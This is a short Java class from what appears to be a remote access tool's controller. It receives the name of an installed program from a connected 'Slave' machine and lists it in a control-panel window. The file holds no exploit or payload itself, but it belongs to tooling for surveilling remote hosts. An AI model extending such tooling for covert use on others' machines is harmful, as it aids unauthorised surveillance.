package com.redpois0n.packets.incoming;

import java.io.DataInputStream;

import com.redpois0n.Slave;
import com.redpois0n.ui.frames.FrameControlPanel;
import com.redpois0n.ui.panels.PanelControlInstalledPrograms;

public class Packet55InstalledProgram extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		String program = slave.readLine();
		
		FrameControlPanel frame = FrameControlPanel.instances.get(slave);
		
		if (frame != null) {
			PanelControlInstalledPrograms panel = (PanelControlInstalledPrograms) frame.panels.get("installed programs");
			panel.getModel().addRow(new Object[] { program });
		}
	}

}
